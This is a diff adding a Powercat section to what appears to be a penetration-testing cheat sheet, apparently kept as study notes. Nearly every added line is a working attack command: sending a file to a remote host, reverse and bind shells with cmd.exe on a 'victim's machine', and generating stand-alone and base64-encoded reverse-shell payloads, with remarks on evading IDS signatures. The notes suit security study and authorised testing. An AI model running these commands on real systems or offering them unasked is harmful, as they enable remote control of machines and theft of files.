@@ -254,3 +254,41 @@ perl —e 'exec "/bin/sh";'
      #Attacker's machine
      socat - OPENSSL:<Victim's IP>:443,verify=0
      ```
+     
+## Powercat
+Powercat can be installed in our Kali with *apt install powercat*, and the script will be placed in */usr/share/windows-resources/powercat*.
+
+### File Transfers
+```powershell
+#Transmitter
+powercat -c X.X.X.X -p 443 -i C:\Users\xonork\some_file.txt
+```
+
+### Reverse Shell
+```powershell
+#Victim's machine
+powercat -c X.X.X.X -p 443 -e cmd.exe
+```
+
+### Bind Shell
+```powershell
+#Victim's machine
+powercat -l -p 443 -e cmd.exe
+```
+
+### Stand-Alone Payloads
+```powershell
+#Victim's machine
+powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverse.ps1
+./reverse.ps1
+#This script mightr be easily detected by IDS. It's very large, it has 300 lines of code and hardcoded strings that can be
+#easily be used in signatures for malicious activity.
+```
+
+```powershell
+#Victim's machine
+powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge> encodedreverse.ps1
+powershell.exe -E eHp6enp6enp6enp6enp6enp6enp6emFhYWFhYWFhYWFhYWFhYWFhYXdhc2FzY2RhZGN1aXNhZGlndXlzYWRpeWdjZGFzaXlhZ2Npc2FjZ2NzYWdhc2NpdWdhY2ljYWdjZ2ljYWdjZ2FzdWk...
+#This way we profit the PowerShell's ability to execute base64 encoded code. The -E flags allow us to execute encoded commands.
+
+
